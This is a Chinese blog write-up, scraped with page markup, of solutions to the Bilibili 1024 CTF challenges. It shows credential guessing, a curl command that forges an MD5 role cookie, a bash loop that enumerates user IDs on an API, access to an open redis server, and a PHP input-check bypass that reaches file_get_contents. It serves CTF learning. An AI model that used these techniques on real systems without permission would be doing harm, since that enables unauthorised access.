src="https://s1.baoshuo.ren/2020/11/28/QEnxZsg8FpiOKwm.png" alt="" loading="lazy"></p><p>有个 test.php ，访问下发现是个 JSfuck 加密，丢进浏览器里面解密下</p><p><img src="https://s1.baoshuo.ren/2020/11/28/G7TWPndrhqBmvAI.png" alt="" loading="lazy"></p><p>程序员最多的地方，那就肯定是 Github 了。</p><p>然后找到了一个仓库 <a href="https://github.com/interesting-1024/end" rel="external nofollow noreferrer">interesting-1024/end</a></p><p>有个 <code>end.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">//filename end.php</span>

<span class="hljs-variable">$bilibili</span> = <span class="hljs-string">"bilibili1024havefun"</span>;

<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]);
<span class="hljs-variable">$reg</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\d/is'</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]);

<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$reg</span> !== <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$str</span> === <span class="hljs-number">1</span>){
    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>]);

    <span class="hljs-comment">//文件路径猜解</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span>){
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"还差一点点啦～"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"你想要的不在这儿～"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre><p>然后需要构造出一个 符合 <code>!is_numeric($_GET['id']) and preg_match('/\d/is', $_GET['id']) !== 1 and intval($_GET['id']) === 1</code> 的请求即可。</p><p><img src="https://s1.baoshuo.ren/2020/11/28/mCIevr1HSMBpkdi.png" alt="" loading="lazy"></p><p>可以得到一个图片的链接 <code>http://45.113.201.36/blog/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</code></p><p><img src="https://s1.baoshuo.ren/2020/11/28/iXEgYzjPtH2NhQw.png" alt="" loading="lazy"></p><p>这个图片的末尾就是第十个 flag 了（图中标蓝的地方）。</p></section><div class="cjScYX jnGacs kpCrIt bMSzLf cvPkWa iigETV dUvWpK hRLVFh "><div class="bpQkXn ">Bilibili 1024 节 CTF Write Up</div><div><a class="kpaoc dLUwcr gcQrEv cdhcuu " href="/post/bilibili-1024-ctf-write-up/">https://blog.baoshuo.ren/post/bilibili-1024-ctf-write-up/</a></div><div class="gSBWlu kiDYix cUXNmd "><div class="gSBWlu iMkoWi hriXhD jjryqL biWxPv "><div class="chVqDG ">本文作者</div><div><a class="fyuAJJ bbUXPo cdhcuu " href="https://baoshuo.ren" target="_blank">宝硕</a></div></div><div class="gSBWlu iMkoWi hriXhD jjryqL biWxPv "><div class="chVqDG ">发布于</div><time datetime="2020-10-26T10:02:08.000Z">2020-10-26</time></div><div class="gSBWlu iMkoWi hriXhD jjryqL biWxPv "><div class="chVqDG ">版权协议</div><div><a class="fyuAJJ bbUXPo cdhcuu " href="https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.zh-Hans" target="_blank" rel="license noopener noreferrer">CC BY-NC-SA 4.0</a></div></div></div><div class="chVqDG ">转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div><i class="cpOcAb bEvNbr eLDTYY iRjWhb QcCvg jdKAzd krZeLX gjJDYK dZDNG gMDOZu cgEEZJ gqWyNB ktfQGr FwRrA cDIyHz hpBjJb ycSPk ctWdVF jkGfDR bSTogt hSDpeY julXB kvHVCE lpnDDz ebRqqn bWKMJW eQlDDM kSnqYR fgiDpI eeAUEW ecjlX cDxIqC jpWidM jzdNVF bPkdhG bnSwfb fQfkux dPenaT NpaJd jgAayQ fqXcHQ dyMCpl jMYtKl blQfIT lijgUQ ccSWYO eGyfkC hhBXzE iyXZtO jZLyOQ beJoMJ iJgiCW hqUHPA jWWlrr hZGkn chpxwD beuMzX dbtvqd jPcnDC "></i></div><div class="kroOag icKiSN bMSzLf fZMRmg iigETV "><a class="kpaoc bbUXPo dSxtaa cdhcuu " href="/tags/CTF/"># <!-- -->CTF</a><a class="kpaoc bbUXPo dSxtaa cdhcuu " href="/tags/Bilibili/"># <!-- -->Bilibili</a></div></article><div class="gCwvuy kRQsoY jBvrhX dgtTIu eXJtsk dvivnl llUCyD dPAasc icKiSN bMSzLf fZMRmg iigETV ipEZTh eRVtDl cUXNmd jdraHW biWxPv eqrBPF kooHYa kroOag"><div>喜欢这篇文章？为什么不考虑打赏一下作者呢？</div><a class="cyerGB moyUB lexxaO ebVilo kyhYEz jIkFRm gpptow bbUXPo kMKXDC ftIldC jOeduE iDuqPI cpOcAb eAOGpx " href="https://afdian.net/@baoshuo" target="_blank" rel="noopener noreferrer">爱发电</a></div><div class="gSBWlu ipEZTh eRVtDl cUXNmd jdraHW biWxPv eqrBPF gvwkfp bRNbBj"><div class="gSBWlu dQPgRK eKlQYW bLlOeF fPWmiY hmKFEM "><a class="gSBWlu foGVKH dgIPcR kVZHcH cVJMrm iATxZH JxWnH " href="/post/ustc-hackergame-2020-write-up/"><i class="dSxtaa bLHLvQ eLDTYY cjScYX cpOcAb jXmXEB hHGIsI julXB kvHVCE jbzBdl SeaTL gjJuRC iWYpgm iHkzF kSnqYR fgiDpI eeAUEW ecjlX fIXfpL ergVCo cqyuit hCTuXM "></i>USTC Hackergame 2020 Write Up</a></div><div class="gSBWlu dQPgRK eKlQYW bLlOeF fXzCvR klEWBS "><a class="gSBWlu foGVKH dgIPcR kVZHcH cVJMrm iATxZH JxWnH " href="/post/raspberry-pi-rtmp-live/">使用树莓派+Nginx搭建 Rtmp 直播服务<i class="kUPESX bLHLvQ eLDTYY cjScYX cpOcAb jXmXEB hHGIsI julXB kvHVCE jbzBdl gUiFRX dixaxG jmWgOv bTanCN kSnqYR fgiDpI eeAUEW ecjlX fIXfpL ergVCo cqyuit hCTuXM "></i></a></div></div><div></div></main></div><div class="imhmwA sKExc bjOGUo eSaSrN "><div class="fyuAJJ kQBRAp bcfNhz edKxdA osxXp foquGP lhTVEC kRQsoY jBvrhX dgtTIu eXJtsk cyerGB egGyMq jsvbrX dPAasc "><i class="cpOcAb cjScYX hHGIsI jXmXEB bLHLvQ eLDTYY dhOkuk julXB hCTuXM cqyuit kvHVCE SeaTL kSnqYR jFCJJY iqzSxf bQvqKh "></i></div><a class="fyuAJJ kQBRAp bcfNhz edKxdA osxXp foquGP lhTVEC kRQsoY jBvrhX dgtTIu eXJtsk cyerGB egGyMq jsvbrX dPAasc " href="#"><i class="cpOcAb cjScYX hHGIsI jXmXEB bLHLvQ eLDTYY dhOkuk julXB hCTuXM cqyuit kvHVCE kSnqYR fgiDpI eeAUEW ecjlX SeaTL gjJuRC iWYpgm iHkzF ergVCo jbBqfU fIXfpL "></i></a></div><footer class="eGElBa ftIldC eBrwtd iDuqPI kpaoc gCwvuy kooHYa eAOGpx dPAasc kKplrA jzScEz hMoAFf bccxkr cgjdEA "><div class="kQBRAp kroOag jZOgvY uUxpw "><div>Copyright © 2019 - <!-- -->2022<!-- --> <a class="fyuAJJ jSOKOm cdhcuu kOZsAO " href="/">宝硕博客</a><span class="jTjNVR iawFZL hNjeNG kswRdL gKQCBv "></span><a class="fyuAJJ jSOKOm cdhcuu kOZsAO " href="https://beian.miit.gov.cn" target="_blank" rel="noopener noreferer nofollow">冀ICP备15024669号-3</a></div><div>Powered by<!-- --> <a class="laXLGQ jSOKOm cdhcuu " href="https://nextjs.org" target="_blank" rel="noopener noreferer nofollow">Next.js</a> &amp; <a class="laXLGQ jSOKOm cdhcuu " href="https://hexo.io" target="_blank" rel="noopener noreferer nofollow">Hexo</a><span class="jTjNVR iawFZL hNjeNG kswRdL gKQCBv "></span>Theme by<!-- --> <a class="laXLGQ jSOKOm cdhcuu " href="https://baoshuo.ren" target="_blank">Baoshuo</a></div></div></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"title":"Bilibili 1024 节 CTF Write Up - 宝硕博客","post":{"title":"Bilibili 1024 节 CTF Write Up","excerpt":null,"content":[["$","p",{},["比赛地址： ",["$","a",{"href":"https://security.bilibili.com/sec1024/","rel":"external nofollow noreferrer"},["https://security.bilibili.com/sec1024/"]]]],["$","h2",{"id":"t1：页面的背后是什么？"},["T1：页面的背后是什么？"]],["$","p",{},[["$","s",{},["F12 解决一切问题"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/XrLpIf2OHs4YAxJ.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t2：真正的秘密只有特殊的设备才能看到"},["T2：真正的秘密只有特殊的设备才能看到"]],["$","p",{},["改下 UA 就行了，轻松到手"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/WPLCUHNYiE2nFwJ.png","alt":"","loading":"lazy"},[]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/83GrjFbTwJf1BHn.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t3：密码是啥？"},["T3：密码是啥？"]],["$","p",{},["看了看源码，没啥思路，最后随便试了试 ",["$","code",{},["admin"]]," ",["$","code",{},["root"]]," ",["$","code",{},["bilibili"]]," 什么的，竟然是对的。"]],["$","ul",{},[["$","li",{},["用户名 ",["$","code",{},["admin"]]]],["$","li",{},["密码 ",["$","code",{},["bilibili"]]]]]],["$","p",{},["另外，你告诉我什么是 ",["$","strong",{},["falg"]]," ？"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/eg9kBtR1aQizGYE.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t4：对不起，权限不足～"},["T4：对不起，权限不足～"]],["$","p",{},["第一次访问："]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/roVjXTfs4v8ibP5.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["第二次访问："]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/RpEsGn8c9KY16MH.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["查看源码可以发现有个 API 请求，查看请求数据得到以下信息。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/nhF7pCTQsVYxKdj.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["role 里面的东西，贴进谷歌一搜就知道它是 ",["$","code",{},["user"]]," 的 MD5 。"]],["$","p",{},["和超级管理员相关的名字相信大家都知道，无非就是 ",["$","code",{},["admin"]]," ",["$","code",{},["Administrator"]]," ",["$","code",{},["root"]]," 之类的东西。"]],["$","p",{},["挨个试，最后发现 ",["$","code",{},["Administrator"]]," 是正确的。"]],["$","pre",{},[["$","code",{"class":"hljs shell"},["curl \"http://45.113.201.36/api/ctf/4\" --cookie \"role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=***;\""]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/gEhkmTJrnaoMwPv.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t5：别人的秘密"},["T5：别人的秘密"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/c4BjYs3nVuCpxmH.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["发现有个 API，还有个 UID。"]],["$","p",{},["最开始没想到需要从代码里面的\"初始 UID\"开始扫，浪费了我好多时间。"]],["$","pre",{},[["$","code",{"class":"hljs shell"},["for ((i=100336889;$i\u003c9999999999;i=($i+1))); do echo -e \"[$i] \\c\" \u0026\u0026 curl \"http://45.113.201.36/api/ctf/5?uid=${i}\" -H 'User-Agent: bilibili Security Browser' -H 'Cookie: session=*****; role=ee11cbb19052e40b07aac0ca060c23ee' ; done"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/m1Hr4u8FOJe7ycI.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"},["T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"]],["$","p",{},["先扫了扫端口，发现有个 redis"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/E29tLxSiC6Qzn5O.png","alt":"","loading":"lazy"},[]]]],["$","pre",{},[["$","code",{"class":"hljs shell"},["redis-cli -h 120.92.151.189 -p 6379"]]]],["$","p",{},["登上去看看，发现了第八题的 flag 。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/Oo5vyeEsChmSt2H.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["然后爆破下目录"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/QEnxZsg8FpiOKwm.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["有个 test.php ，访问下发现是个 JSfuck 加密，丢进浏览器里面解密下"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/G7TWPndrhqBmvAI.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["程序员最多的地方，那就肯定是 Github 了。"]],["$","p",{},["然后找到了一个仓库 ",["$","a",{"href":"https://github.com/interesting-1024/end","rel":"external nofollow noreferrer"},["interesting-1024/end"]]]],["$","p",{},["有个 ",["$","code",{},["end.php"]]]],["$","pre",{},[["$","code",{"class":"hljs php"},[["$","span",{"class":"hljs-meta"},["\u003c?php"]],"\n\n",["$","span",{"class":"hljs-comment"},["//filename end.php"]],"\n\n",["$","span",{"class":"hljs-variable"},["$bilibili"]]," = ",["$","span",{"class":"hljs-string"},["\"bilibili1024havefun\""]],";\n\n",["$","span",{"class":"hljs-variable"},["$str"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["intval"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]);\n",["$","span",{"class":"hljs-variable"},["$reg"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["preg_match"]],"(",["$","span",{"class":"hljs-string"},["'/\\d/is'"]],", ",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]);\n\n",["$","span",{"class":"hljs-keyword"},["if"]],"(!",["$","span",{"class":"hljs-title function_ invoke__"},["is_numeric"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]) ",["$","span",{"class":"hljs-keyword"},["and"]]," ",["$","span",{"class":"hljs-variable"},["$reg"]]," !== ",["$","span",{"class":"hljs-number"},["1"]]," ",["$","span",{"class":"hljs-keyword"},["and"]]," ",["$","span",{"class":"hljs-variable"},["$str"]]," === ",["$","span",{"class":"hljs-number"},["1"]],"){\n    ",["$","span",{"class":"hljs-variable"},["$content"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["file_get_contents"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'url'"]],"]);\n\n    ",["$","span",{"class":"hljs-comment"},["//文件路径猜解"]],"\n    ",["$","span",{"class":"hljs-keyword"},["if"]]," (",["$","span",{"class":"hljs-literal"},["false"]],"){\n        ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-string"},["\"还差一点点啦～\""]],";\n    }",["$","span",{"class":"hljs-keyword"},["else"]],"{\n        ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-variable"},["$flag"]],";\n    }\n}",["$","span",{"class":"hljs-keyword"},["else"]],"{\n    ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-string"},["\"你想要的不在这儿～\""]],";\n}\n",["$","span",{"class":"hljs-meta"},["?\u003e"]]]]]],["$","p",{},["然后需要构造出一个 符合 ",["$","code",{},["!is_numeric($_GET['id']) and preg_match('/\\d/is', $_GET['id']) !== 1 and intval($_GET['id']) === 1"]]," 的请求即可。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/mCIevr1HSMBpkdi.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["可以得到一个图片的链接 ",["$","code",{},["http://45.113.201.36/blog/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/iXEgYzjPtH2NhQw.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["这个图片的末尾就是第十个 flag 了（图中标蓝的地方）。"]]],"thumb":"https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg","date":"2020-10-26","updated":"2020-10-26","isoDate":"2020-10-26T10:02:08.000Z","isoUpdate":"2020-10-26T10:02:08.000Z","categories":[{"name":"技术向","url":"/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"tags":[{"name":"CTF","url":"/tags/CTF/"},{"name":"Bilibili","url":"/tags/Bilibili/"}],"license":null,"permalink":"https://blog.baoshuo.ren/post/bilibili-1024-ctf-write-up/","url":"/post/bilibili-1024-ctf-write-up/","prev":{"title":"USTC Hackergame 2020 Write Up","url":"/post/ustc-hackergame-2020-write-up/"},"next":{"title":"使用树莓派+Nginx搭建 Rtmp 直播服务","url":"/post/raspberry-pi-rtmp-live/"},"toc":{"0":{"text":"T1：页面的背后是什么？","id":"t1：页面的背后是什么？"},"1":{"text":"T2：真正的秘密只有特殊的设备才能看到","id":"t2：真正的秘密只有特殊的设备才能看到"},"2":{"text":"T3：密码是啥？","id":"t3：密码是啥？"},"3":{"text":"T4：对不起，权限不足～","id":"t4：对不起，权限不足～"},"4":{"text":"T5：别人的秘密","id":"t5：别人的秘密"},"5":{"text":"T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～","id":"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"}},"hasToc":true,"comments":true,"wordCount":"590 字"}},"__N_SSG":true},"page":"/post/[slug]","query":{"slug":"bilibili-1024-ctf-write-up"},"buildId":"k90Ni_4Pr-FWD9VknAbFR","assetPrefix":"https://static.cdn.baoshuo.ren/blog","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>